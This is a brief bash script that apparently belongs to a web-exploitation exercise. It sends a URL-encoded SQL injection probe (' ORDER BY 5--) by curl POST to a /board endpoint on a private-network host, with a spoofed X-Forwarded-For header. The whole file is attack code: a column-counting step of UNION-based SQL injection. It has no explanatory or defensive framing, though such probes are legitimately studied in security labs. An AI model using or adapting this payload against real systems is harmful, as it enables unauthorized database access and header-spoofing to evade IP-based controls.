#!/bin/bash
TARGET="http://172.20.10.2:3000"
MY_IP="10.0.0.103"
# ' ORDER BY 5--
PAYLOAD="content=%27%20ORDER%20BY%205--"

curl -v -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: $MY_IP" \
  -d "$PAYLOAD" \
  "$TARGET/board"

